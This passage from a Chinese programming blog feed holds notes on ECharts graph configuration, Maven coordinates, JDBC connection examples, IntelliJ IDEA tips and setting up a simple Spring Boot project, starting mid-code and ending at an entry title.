<span class="hljs-comment">//鼠标悬浮时在图形元素上时鼠标的样式是什么。同 CSS 的 cursor。</span></span><span class="javascript">            label: &#123;                      <span class="hljs-comment">//图形上的文本标签，可用于说明图形的一些数据信息，比如值，名称等，</span></span><span class="javascript">              <span class="hljs-comment">// normal: mylabel,</span></span><span class="javascript">              <span class="hljs-comment">// emphasis: mylabel</span></span>            &#125;,<span class="javascript">            edgeLabel: &#123; <span class="hljs-comment">// 显示线中间的标签</span></span><span class="javascript">              <span class="hljs-comment">// show: true,</span></span><span class="javascript">              <span class="hljs-comment">// normal: mylabel,</span></span><span class="javascript">              <span class="hljs-comment">// emphasis: mylabel</span></span>            &#125;,<span class="javascript">            emphasis: &#123; <span class="hljs-comment">// 悬浮出现的高亮的图形样式。</span></span><span class="javascript">              <span class="hljs-comment">// lineStyle: mylineStyle,</span></span><span class="javascript">              <span class="hljs-comment">// itemStyle: myitemStyle,</span></span><span class="javascript">              <span class="hljs-comment">// label: mylineStyle,</span></span><span class="javascript">              <span class="hljs-comment">// edgeLabel: mylineStyle,</span></span>            &#125;,<span class="javascript">            itemStyle: &#123;                 <span class="hljs-comment">//图形样式，normal 是图形在默认状态下的样式；emphasis 是图形在高亮状态下的样式，比如在鼠标悬浮或者图例联动高亮时。</span></span><span class="javascript">              <span class="hljs-comment">// normal: myitemStyle,</span></span><span class="javascript">              <span class="hljs-comment">// emphasis: myitemStyle,</span></span>            &#125;,<span class="javascript">            lineStyle: &#123;                 <span class="hljs-comment">//图形样式，normal 是图形在默认状态下的样式；emphasis 是图形在高亮状态下的样式，比如在鼠标悬浮或者图例联动高亮时。</span></span><span class="javascript">              <span class="hljs-comment">// normal: mylineStyle,</span></span><span class="javascript">              <span class="hljs-comment">// emphasis: mylineStyle,</span></span>            &#125;,<span class="javascript">            categories: [                <span class="hljs-comment">//节点分类的类目，可选。</span></span>              &#123;<span class="javascript">                name: <span class="hljs-string">&quot;当前特征&quot;</span>,    <span class="hljs-comment">//类目名称</span></span><span class="javascript">                <span class="hljs-comment">// symbol: &quot;circle&quot;,       //图形 &#x27;circle&#x27;, &#x27;rect&#x27;, &#x27;roundRect&#x27;, &#x27;triangle&#x27;, &#x27;diamond&#x27;, &#x27;pin&#x27;, &#x27;arrow&#x27;</span></span><span class="javascript">                <span class="hljs-comment">// symbolSize: 50,      //标记的大小，可以设置成诸如 10 这样单一的数字，也可以用数组分开表示宽和高，例如 [20, 10] 表示标记宽为20，高为10。</span></span><span class="javascript">                <span class="hljs-comment">// symbolRotate: 0,     //标记的旋转角度。注意在 markLine 中当 symbol 为 &#x27;arrow&#x27; 时会忽略 symbolRotate 强制设置为切线的角度。</span></span><span class="javascript">                <span class="hljs-comment">// symbolOffset: [0, 0], //标记相对于原本位置的偏移。默认情况下，标记会居中置放在数据对应的位置</span></span><span class="javascript">                <span class="hljs-comment">// label: &#123;              //图形上的文本标签，可用于说明图形的一些数据信息，比如值，名称等，</span></span><span class="javascript">                <span class="hljs-comment">//   normal: mylabel,</span></span><span class="javascript">                <span class="hljs-comment">//   emphasis: mylabel</span></span><span class="javascript">                <span class="hljs-comment">// &#125;,</span></span><span class="javascript">                <span class="hljs-comment">// itemStyle: &#123;         //图形样式，normal 是图形在默认状态下的样式；emphasis 是图形在高亮状态下的样式，比如在鼠标悬浮或者图例联动高亮时。</span></span><span class="javascript">                <span class="hljs-comment">//   normal: myitemStyle,</span></span><span class="javascript">                <span class="hljs-comment">//   emphasis: myitemStyle,</span></span><span class="javascript">                <span class="hljs-comment">// &#125;,</span></span>              &#125;,              &#123;<span class="javascript">                name: <span class="hljs-string">&quot;个人特征&quot;</span>,    <span class="hljs-comment">//类目名称</span></span><span class="javascript">                <span class="hljs-comment">// symbol: &quot;rect&quot;,       //图形 &#x27;circle&#x27;, &#x27;rect&#x27;, &#x27;roundRect&#x27;, &#x27;triangle&#x27;, &#x27;diamond&#x27;, &#x27;pin&#x27;, &#x27;arrow&#x27;</span></span><span class="javascript">                <span class="hljs-comment">// symbolSize: 50,      //标记的大小，可以设置成诸如 10 这样单一的数字，也可以用数组分开表示宽和高，例如 [20, 10] 表示标记宽为20，高为10。</span></span><span class="javascript">                <span class="hljs-comment">// symbolRotate: 0,     //标记的旋转角度。注意在 markLine 中当 symbol 为 &#x27;arrow&#x27; 时会忽略 symbolRotate 强制设置为切线的角度。</span></span><span class="javascript">                <span class="hljs-comment">// symbolOffset: [0, 0], //标记相对于原本位置的偏移。默认情况下，标记会居中置放在数据对应的位置</span></span><span class="javascript">                <span class="hljs-comment">// label: &#123;              //图形上的文本标签，可用于说明图形的一些数据信息，比如值，名称等，</span></span><span class="javascript">                <span class="hljs-comment">//   normal: mylabel,</span></span><span class="javascript">                <span class="hljs-comment">//   emphasis: mylabel</span></span><span class="javascript">                <span class="hljs-comment">// &#125;,</span></span><span class="javascript">                <span class="hljs-comment">// itemStyle: &#123;         //图形样式，normal 是图形在默认状态下的样式；emphasis 是图形在高亮状态下的样式，比如在鼠标悬浮或者图例联动高亮时。</span></span><span class="javascript">                <span class="hljs-comment">//   normal: myitemStyle,</span></span><span class="javascript">                <span class="hljs-comment">//   emphasis: myitemStyle,</span></span><span class="javascript">                <span class="hljs-comment">// &#125;,</span></span>              &#125;,              &#123;<span class="javascript">                name: <span class="hljs-string">&quot;公共特征&quot;</span>,    <span class="hljs-comment">//类目名称</span></span><span class="javascript">                <span class="hljs-comment">// symbol: &quot;roundRect&quot;,       //图形 &#x27;circle&#x27;, &#x27;rect&#x27;, &#x27;roundRect&#x27;, &#x27;triangle&#x27;, &#x27;diamond&#x27;, &#x27;pin&#x27;, &#x27;arrow&#x27;</span></span><span class="javascript">                <span class="hljs-comment">// symbolSize: 50,      //标记的大小，可以设置成诸如 10 这样单一的数字，也可以用数组分开表示宽和高，例如 [20, 10] 表示标记宽为20，高为10。</span></span><span class="javascript">                <span class="hljs-comment">// symbolRotate: 0,     //标记的旋转角度。注意在 markLine 中当 symbol 为 &#x27;arrow&#x27; 时会忽略 symbolRotate 强制设置为切线的角度。</span></span><span class="javascript">                <span class="hljs-comment">// symbolOffset: [0, 0], //标记相对于原本位置的偏移。默认情况下，标记会居中置放在数据对应的位置</span></span><span class="javascript">                <span class="hljs-comment">// label: &#123;              //图形上的文本标签，可用于说明图形的一些数据信息，比如值，名称等，</span></span><span class="javascript">                <span class="hljs-comment">//   normal: mylabel,</span></span><span class="javascript">                <span class="hljs-comment">//   emphasis: mylabel</span></span><span class="javascript">                <span class="hljs-comment">// &#125;,</span></span><span class="javascript">                <span class="hljs-comment">// itemStyle: &#123;         //图形样式，normal 是图形在默认状态下的样式；emphasis 是图形在高亮状态下的样式，比如在鼠标悬浮或者图例联动高亮时。</span></span><span class="javascript">                <span class="hljs-comment">//   normal: myitemStyle,</span></span><span class="javascript">                <span class="hljs-comment">//   emphasis: myitemStyle,</span></span><span class="javascript">                <span class="hljs-comment">// &#125;,</span></span>              &#125;,              &#123;<span class="javascript">                name: <span class="hljs-string">&quot;特征画布&quot;</span>,    <span class="hljs-comment">//类目名称</span></span><span class="javascript">                <span class="hljs-comment">// symbol: &quot;pin&quot;,       //图形 &#x27;circle&#x27;, &#x27;rect&#x27;, &#x27;roundRect&#x27;, &#x27;triangle&#x27;, &#x27;diamond&#x27;, &#x27;pin&#x27;, &#x27;arrow&#x27;</span></span><span class="javascript">                <span class="hljs-comment">// symbolSize: 50,      //标记的大小，可以设置成诸如 10 这样单一的数字，也可以用数组分开表示宽和高，例如 [20, 10] 表示标记宽为20，高为10。</span></span><span class="javascript">                <span class="hljs-comment">// symbolRotate: 0,     //标记的旋转角度。注意在 markLine 中当 symbol 为 &#x27;arrow&#x27; 时会忽略 symbolRotate 强制设置为切线的角度。</span></span><span class="javascript">                <span class="hljs-comment">// symbolOffset: [0, 0], //标记相对于原本位置的偏移。默认情况下，标记会居中置放在数据对应的位置</span></span><span class="javascript">                <span class="hljs-comment">// label: &#123;              //图形上的文本标签，可用于说明图形的一些数据信息，比如值，名称等，</span></span><span class="javascript">                <span class="hljs-comment">//   normal: mylabel,</span></span><span class="javascript">                <span class="hljs-comment">//   emphasis: mylabel</span></span><span class="javascript">                <span class="hljs-comment">// &#125;,</span></span><span class="javascript">                <span class="hljs-comment">// itemStyle: &#123;         //图形样式，normal 是图形在默认状态下的样式；emphasis 是图形在高亮状态下的样式，比如在鼠标悬浮或者图例联动高亮时。</span></span><span class="javascript">                <span class="hljs-comment">//   normal: myitemStyle,</span></span><span class="javascript">                <span class="hljs-comment">//   emphasis: myitemStyle,</span></span><span class="javascript">                <span class="hljs-comment">// &#125;,</span></span>              &#125;,            ],<span class="javascript">            data: [                     <span class="hljs-comment">//data就是node</span></span>              &#123;<span class="javascript">                name: <span class="hljs-string">&#x27;当前特征&#x27;</span>,</span><span class="javascript">                <span class="hljs-comment">// x: 100,</span></span><span class="javascript">                <span class="hljs-comment">// y: 100,</span></span><span class="javascript">                <span class="hljs-comment">// value: 20,</span></span><span class="javascript">                <span class="hljs-comment">// symbolSize: 20,</span></span>                itemStyle: &#123;                  normal: &#123;<span class="javascript">                    color: <span class="hljs-string">&#x27;blank&#x27;</span></span>                  &#125;                &#125;              &#125;, &#123;<span class="javascript">                name: <span class="hljs-string">&#x27;个人特征&#x27;</span>,</span><span class="javascript">                <span class="hljs-comment">// x: 100,</span></span><span class="javascript">                <span class="hljs-comment">// y: 100,</span></span><span class="javascript">                <span class="hljs-comment">// value: 20,</span></span><span class="javascript">                <span class="hljs-comment">// symbolSize: 20,</span></span>                itemStyle: &#123;                  normal: &#123;<span class="javascript">                    color: <span class="hljs-string">&#x27;#15a4fa&#x27;</span></span>                  &#125;                &#125;              &#125;, &#123;<span class="javascript">                name: <span class="hljs-string">&#x27;公共特征&#x27;</span>,</span><span class="javascript">                <span class="hljs-comment">// x: 100,</span></span><span class="javascript">                <span class="hljs-comment">// y: 100,</span></span><span class="javascript">                <span class="hljs-comment">// value: 20,</span></span><span class="javascript">                <span class="hljs-comment">// symbolSize: 20,</span></span>                itemStyle: &#123;<span class="javascript">                  color: <span class="hljs-string">&#x27;blue&#x27;</span></span>                &#125;              &#125;, &#123;<span class="javascript">                name: <span class="hljs-string">&#x27;特征画布&#x27;</span>,</span><span class="javascript">                <span class="hljs-comment">// x: 100,</span></span><span class="javascript">                <span class="hljs-comment">// y: 100,</span></span><span class="javascript">                <span class="hljs-comment">// value: 20,</span></span><span class="javascript">                <span class="hljs-comment">// symbolSize: 100,</span></span>                itemStyle: &#123;<span class="javascript">                  color: <span class="hljs-string">&#x27;red&#x27;</span></span>                &#125;              &#125;            ],<span class="javascript">            links: [                 <span class="hljs-comment">//links就是edges</span></span>              &#123;<span class="javascript">                source: <span class="hljs-string">&#x27;当前特征&#x27;</span>,</span><span class="javascript">                target: <span class="hljs-string">&#x27;个人特征&#x27;</span></span>              &#125;, &#123;<span class="javascript">                source: <span class="hljs-string">&#x27;当前特征&#x27;</span>,</span><span class="javascript">                target: <span class="hljs-string">&#x27;公共特征&#x27;</span></span>              &#125;, &#123;<span class="javascript">                source: <span class="hljs-string">&#x27;当前特征&#x27;</span>,</span><span class="javascript">                target: <span class="hljs-string">&#x27;特征画布&#x27;</span></span>              &#125;            ],<span class="javascript">            <span class="hljs-comment">//markPoint:同bar</span></span><span class="javascript">            <span class="hljs-comment">//markLine:同bar</span></span><span class="javascript">            <span class="hljs-comment">//markArea:同bar</span></span><span class="javascript">            <span class="hljs-comment">// tooltip: tooltip</span></span>          &#125;,        ]      &#125;    &#125;;  &#125;,  mounted () &#123; &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre>]]></content>
    
    
    <categories>
      
      <category>前端</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>echart graph动态添加数据</title>
    <link href="/2019/12/27/echart-graph%E5%8A%A8%E6%80%81%E6%B7%BB%E5%8A%A0%E6%95%B0%E6%8D%AE/index/"/>
    <url>/2019/12/27/echart-graph%E5%8A%A8%E6%80%81%E6%B7%BB%E5%8A%A0%E6%95%B0%E6%8D%AE/index/</url>
    
    <content type="html"><![CDATA[<h4 id="tips-数据是前台写的假数据"><a href="#tips-数据是前台写的假数据" class="headerlink" title="tips:数据是前台写的假数据"></a>tips:数据是前台写的假数据</h4><p>自己写的demo，更改数据后直接就能用</p><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;height: 100%&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;height: 100%; margin: 0&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;container&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;height: 100%&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://cdn.staticfile.org/echarts/4.3.0/echarts.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-keyword">var</span> josnarr=[];</span><span class="javascript"><span class="hljs-keyword">var</span> jsonarrlink=[];</span><span class="javascript"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">3</span>;i++) &#123;</span><span class="javascript">    <span class="hljs-keyword">var</span> json=&#123;&#125;;</span>    json.id=i;<span class="javascript">    json.name=<span class="hljs-string">&quot;name&quot;</span>+i;</span><span class="javascript">    json.data=json.name+<span class="hljs-string">&quot;data&quot;</span>+i;</span>    if(i!=2)&#123;<span class="javascript">        json.rely=<span class="hljs-string">&quot;name&quot;</span>+(i+<span class="hljs-number">1</span>);</span>    &#125;    json.x=i*50+300;    json.y=300;    josnarr.push(json);&#125;<span class="javascript"><span class="hljs-built_in">console</span>.log(josnarr);</span><span class="javascript"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">3</span>;i++)&#123;</span><span class="javascript">    <span class="hljs-keyword">var</span> json=&#123;&#125;;</span>    json.source=josnarr[i].rely;    json.target=josnarr[i].name;    jsonarrlink.push(json);&#125;<span class="javascript"><span class="hljs-built_in">console</span>.log(jsonarrlink);</span><span class="javascript"><span class="hljs-keyword">var</span> jsondata=[];</span><span class="javascript">    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i=<span class="hljs-number">0</span>;i&lt;josnarr.length;i++)&#123;</span><span class="javascript">         <span class="hljs-keyword">var</span> json=&#123;&#125;;</span>         json.name=josnarr[i].name;         json.x=josnarr[i].x;         json.y=josnarr[i].y;         jsondata.push(json);    &#125;<span class="javascript"><span class="hljs-built_in">console</span>.log(jsondata);</span><span class="javascript">    <span class="hljs-keyword">var</span> dom = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;container&quot;</span>);</span><span class="javascript">    <span class="hljs-keyword">var</span> myChart = echarts.init(dom);</span><span class="javascript">    <span class="hljs-keyword">var</span> app = &#123;&#125;;</span><span class="javascript">    option = <span class="hljs-literal">null</span>;</span>    option = &#123;        title: &#123;<span class="javascript">            text: <span class="hljs-string">&#x27;Graph 简单示例&#x27;</span></span>        &#125;,        tooltip: &#123;&#125;,        animationDurationUpdate: 1500,<span class="javascript">        animationEasingUpdate: <span class="hljs-string">&#x27;quinticInOut&#x27;</span>,</span>        series: [            &#123;<span class="javascript">                type: <span class="hljs-string">&#x27;graph&#x27;</span>,</span><span class="javascript">                layout: <span class="hljs-string">&#x27;none&#x27;</span>,</span>                symbolSize: 50,<span class="javascript">                roam: <span class="hljs-literal">true</span>,</span>                label: &#123;                    normal: &#123;<span class="javascript">                        show: <span class="hljs-literal">true</span></span>                    &#125;                &#125;,<span class="javascript">                edgeSymbol: [<span class="hljs-string">&#x27;circle&#x27;</span>, <span class="hljs-string">&#x27;arrow&#x27;</span>],</span>                edgeSymbolSize: [4, 10],                edgeLabel: &#123;                    normal: &#123;                        textStyle: &#123;                            fontSize: 20                        &#125;                    &#125;                &#125;,                data: jsondata,<span class="javascript">                <span class="hljs-comment">// links: [],</span></span>                links: jsonarrlink,            &#125;        ]    &#125;;    ;<span class="javascript">    <span class="hljs-keyword">if</span> (option &amp;&amp; <span class="hljs-keyword">typeof</span> option === <span class="hljs-string">&quot;object&quot;</span>) &#123;</span><span class="javascript">        myChart.setOption(option, <span class="hljs-literal">true</span>);</span>    &#125;<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre>]]></content>
    
    
    <categories>
      
      <category>前端</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Maven中的GroupId和Artifact Id</title>
    <link href="/2019/12/16/maven%E4%B8%AD%E7%9A%84groupid%E5%92%8Cartifact-id/index/"/>
    <url>/2019/12/16/maven%E4%B8%AD%E7%9A%84groupid%E5%92%8Cartifact-id/index/</url>
    
    <content type="html"><![CDATA[<p>groupid和artifactId被统称为“坐标”是为了保证项目唯一性而提出的，如果你要把你项目弄到maven本地仓库去，你想要找到你的项目就必须根据这两个id去查找。 　　groupId一般分为多个段，第一段为域，第二段为公司名称。域又分为org、com、cn等等许多，其中org为非营利组织，com为商业组织。 　比如我创建一个项目，我一般会将groupId设置为cn.qt，cn表示域为中国，qt是我个人姓名缩写，artifactId设置为testProj，表示你这个项目的名称是testProj，依照这个设置，你的包结构最好是cn.qt.testProj打头的，如果有个StudentDao，它的全路径就是cn.qt.testProj.dao.StudentDao</p>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>No suitable driver found for jdbc:mysql://localhost:3306/ 问题</title>
    <link href="/2019/12/16/no-suitable-driver-found-for-jdbcmysql-localhost3306-%E9%97%AE%E9%A2%98/index/"/>
    <url>/2019/12/16/no-suitable-driver-found-for-jdbcmysql-localhost3306-%E9%97%AE%E9%A2%98/index/</url>
    
    <content type="html"><![CDATA[<p>一：连接URL格式出现了问题(Connection conn=DriverManager.getConnection(“jdbc:mysql://localhost:3306/XX”,“root”,“XXXX”)</p><p>二：驱动字符串出错(com.mysql.jdbc.Driver)</p><p>三：Classpath中没有加入合适的mysql_jdbc驱动（驱动要和你的数据库版本一致） CLASSPATH=.;…;E:\tools\apache-jmeter-2.9\lib\mysql-connector- java-5.1.33-bin.jar;</p><p>四：驱动jar包放的位置不对</p>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>程序的耦合</title>
    <link href="/2019/12/16/%E7%A8%8B%E5%BA%8F%E7%9A%84%E8%80%A6%E5%90%88/index/"/>
    <url>/2019/12/16/%E7%A8%8B%E5%BA%8F%E7%9A%84%E8%80%A6%E5%90%88/index/</url>
    
    <content type="html"><![CDATA[<pre><code class="hljs gcode">耦合性<span class="hljs-comment">(Coupling)</span>，也叫耦合度，是对模块间关联程度的度量。耦合的强弱取决于模块间接口的复杂性、调用模块的方式以及通过界面传送数据的多少。模块间的耦合度是指模块之间的依赖关系，包括控制关系、调用关系、数据传递关系。模块间联系越多，其耦合性越强，同时表明其独立性越差<span class="hljs-comment">( 降低耦合性，可以提高其独立性)</span>。软件设计中通常用耦合度和内聚度作为衡量模块独立程度的标准。划分模块的一个准则就是高内聚低耦合。</code></pre><p>笔记：耦合：程序间的依赖关系</p><p>包括：类之间的依赖 方法之间的依赖 解耦：降低程序间的依赖关系 解耦的思路： 第一步：使用反射来创建对象，而避免使用new关键字 第二步：通过读取配置文件来获取要创建的对象全限定实名</p>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>简单的jdbc工程代码</title>
    <link href="/2019/12/16/%E7%AE%80%E5%8D%95%E7%9A%84jdbc%E5%B7%A5%E7%A8%8B%E4%BB%A3%E7%A0%81/index/"/>
    <url>/2019/12/16/%E7%AE%80%E5%8D%95%E7%9A%84jdbc%E5%B7%A5%E7%A8%8B%E4%BB%A3%E7%A0%81/index/</url>
    
    <content type="html"><![CDATA[<pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.qt.jdbc;<span class="hljs-keyword">import</span> com.mysql.jdbc.Driver;<span class="hljs-keyword">import</span> java.sql.Connection;<span class="hljs-keyword">import</span> java.sql.DriverManager;<span class="hljs-keyword">import</span> java.sql.PreparedStatement;<span class="hljs-keyword">import</span> java.sql.ResultSet;<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">jdbc01</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span>  <span class="hljs-params">(String[] args)</span> </span>&#123;        <span class="hljs-comment">//1.注册驱动</span>        <span class="hljs-keyword">try</span> &#123;           <span class="hljs-comment">// Driver dic = new Driver();</span>            DriverManager.registerDriver(<span class="hljs-keyword">new</span> com.mysql.jdbc.Driver());            <span class="hljs-comment">//2.获取连接</span>            Connection  conn=DriverManager.getConnection(<span class="hljs-string">&quot;jdbc:mysql://localhost:3306/spring&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>,<span class="hljs-string">&quot;123456&quot;</span>);            <span class="hljs-comment">//3.获取操作数据库的具体数据库</span>            PreparedStatement pstm=conn.prepareStatement(<span class="hljs-string">&quot;select  * from account&quot;</span>);            <span class="hljs-comment">//4.执行sql，得到结果集</span>            ResultSet rs=pstm.executeQuery();            <span class="hljs-comment">//5.打印</span>            <span class="hljs-keyword">while</span> (rs.next())&#123;                System.out.println(rs.getString(<span class="hljs-string">&quot;name&quot;</span>));            &#125;            rs.close();            pstm.close();            conn.close();        &#125;        <span class="hljs-keyword">catch</span> (Exception e)        &#123;             System.out.println(e);        &#125;    &#125;&#125;</code></pre>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>IDEA创建SpringBoot项目报错artifact contains illegal characters</title>
    <link href="/2019/12/09/idea%E5%88%9B%E5%BB%BAspringboot%E9%A1%B9%E7%9B%AE%E6%8A%A5%E9%94%99artifact-contains-illegal-characters/index/"/>
    <url>/2019/12/09/idea%E5%88%9B%E5%BB%BAspringboot%E9%A1%B9%E7%9B%AE%E6%8A%A5%E9%94%99artifact-contains-illegal-characters/index/</url>
    
    <content type="html"><![CDATA[<p><img src="images/1210854-20171024134004613-1234080464.png"></p><p>artifact contains illegal characters翻译过来就是工件包含非法字符，将artifact全改为小写即可</p>]]></content>
    
    
    <categories>
      
      <category>idea相关</category>
      
      <category>java</category>
      
      <category>springboot</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>idea2019.1自动补全</title>
    <link href="/2019/12/09/idea2019-1%E8%87%AA%E5%8A%A8%E8%A1%A5%E5%85%A8/index/"/>
    <url>/2019/12/09/idea2019-1%E8%87%AA%E5%8A%A8%E8%A1%A5%E5%85%A8/index/</url>
    
    <content type="html"><![CDATA[<p>点击文件（file）-&gt;设置（setting）-&gt;plugins-搜索lombok-&gt;点击箭头所指的位置安装</p><p><img src="images/20191209213314.png"></p>]]></content>
    
    
    <categories>
      
      <category>idea相关</category>
      
      <category>java</category>
      
      <category>springboot</category>
      
      <category>杂七杂八区</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>idea字体模糊</title>
    <link href="/2019/12/09/idea%E5%AD%97%E4%BD%93%E6%A8%A1%E7%B3%8A/index/"/>
    <url>/2019/12/09/idea%E5%AD%97%E4%BD%93%E6%A8%A1%E7%B3%8A/index/</url>
    
    <content type="html"><![CDATA[<p>idea字体模糊 在file-settings-editor-font 下设置font如下图，设置consolas 或者其他几种，都不会再虚化。（我的汉化了）</p><p><img src="images/a.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>idea相关</category>
      
      <category>java</category>
      
      <category>springboot</category>
      
      <category>杂七杂八区</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>springboot学习-01springboot简介及核心功能</title>
    <link href="/2019/12/09/springboot%E5%AD%A6%E4%B9%A0-01springboot%E7%AE%80%E4%BB%8B%E5%8F%8A%E6%A0%B8%E5%BF%83%E5%8A%9F%E8%83%BD/index/"/>
    <url>/2019/12/09/springboot%E5%AD%A6%E4%B9%A0-01springboot%E7%AE%80%E4%BB%8B%E5%8F%8A%E6%A0%B8%E5%BF%83%E5%8A%9F%E8%83%BD/index/</url>
    
    <content type="html"><![CDATA[<h4 id="简介："><a href="#简介：" class="headerlink" title="简介："></a>简介：</h4><p>  Spring Boot是Spring社区发布的一个开源项目，旨在帮助开发者快速并且更简单的构建项目。它使用习惯优于配置的理念让你的项目快速运行起来，使用Spring Boot很容易创建一个独立运行（运行jar，内置Servlet容器，Tomcat、jetty）、准生产级别的基于Spring框架的项目，使用SpringBoot你可以不用或者只需要很少的配置文件。</p><h4 id="核心功能："><a href="#核心功能：" class="headerlink" title="核心功能："></a>核心功能：</h4><p>  独立运行的Spring项目：可以以jar包形式独立运行，通过java -jar xx.jar即可运行。 内嵌Servlet容器：可以选择内嵌Tomcat、Jetty等。 提供starter简化maven配置：一个maven项目，使用了spring-boot-starter-web时，会自动加载Spring Boot的依赖包。 自动配置Spring：Spring。 Boot会根据在类路径中的jar包、类，为jar包中的类自动配置Bean。 准生产的应用监控：提供基于http、ssh、telnet对运行时的项目进行监控。 无代码生成和xml配置：主要通过条件注解来实现。</p>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
      <category>springboot</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>使用IDEA搭建一个简单的SpringBoot项目</title>
    <link href="/2019/12/09/%E4%BD%BF%E7%94%A8idea%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84springboot%E9%A1%B9%E7%9B%AE/index/"/>
    <url>/2019/12/09/%E4%BD%BF%E7%94%A8idea%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84springboot%E9%A1%B9%E7%9B%AE/index/</url>
    
    <content type="html"><![CDATA[<ol><li><p>File-&gt;new-&gt;project</p></li><li><p>选择“Spring Initializr”，点击next；（jdk1.8默认即可，用习惯了）</p></li><li><p>完善项目信息，组名可不做修改，项目名可做修改；最终建的项目名为：test，src-&gt;main-&gt;java下包名会是：com-&gt;example-&gt;test；点击next</p></li><li><p>Web下勾选Spring Web Start，（网上创建springboot项目多是勾选Web选项，而较高版本的Springboot没有此选项，勾选Spring Web Start即可，2.1.8版本是Spring Web）；Template Englines勾选Thymeleaf；SQL勾选：MySQL Driver，JDBC API 和 MyBatis Framework三项；点击next</p></li><li><p>选择项目路径，点击finish；打开新的窗口</p></li><li><p>点击右侧的Maven，点击设置（扳手图标）进行项目Maven仓库的配置</p></li><li><p>（1）选择本地Maven路径； （2）勾选配置文件后边的选项，然后修改为本地Maven的配置文件，它会根据配置文件直接找到本地仓库位置</p></li><li><p>配置完后，如果没有自动导包，可以点击左上角重新导包按钮，或者下载按钮，选择下载所有源文件和文档</p></li><li><p>在templates文件下新建index.html页面，作为启动的初始页面</p></li><li><p>在com.example.test下新建controller文件夹，在controller文件夹下建一个简单的helloController类；（Controller类要添加@Controller注解，项目启动时，SpringBoot会自动扫描加载Controller）</p><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.test.controller;<span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<span class="hljs-meta">@Controller</span><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloController</span> </span>&#123;<span class="hljs-meta">@RequestMapping(&quot;/index&quot;)</span><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">sayHello</span><span class="hljs-params">()</span></span>&#123;    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;index&quot;</span>;&#125;&#125;</code></pre></li><li><p>在resources文件夹下application中先配置DataSource基本信息，application文件有两种文件格式，一种是以.properties为后缀，一种是以.yml为后缀的，两种配置方式略有差别、在这我是用.yml后缀的文件格式。右键application文件选择Refact，选择Rename，将后缀改为yml</p><pre><code class="hljs xml">spring:  datasource:    name: test  #数据库名    url: jdbc:mysql://localhost:3306/test #url    username: root  #用户名    password: 123456  #密码    driver-class-name: com.mysql.jdbc.Driver  #数据库链接驱动</code></pre></li><li><p>运行项目启动类TestApplication.java</p></li><li><p>在浏览器中输入localhost:8080 ,回车显示初始的index界面，到这里项目的初步搭建已经完成</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
      <category>springboot</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>解决idea下maven项目创建缓慢,下载速度过慢</title>
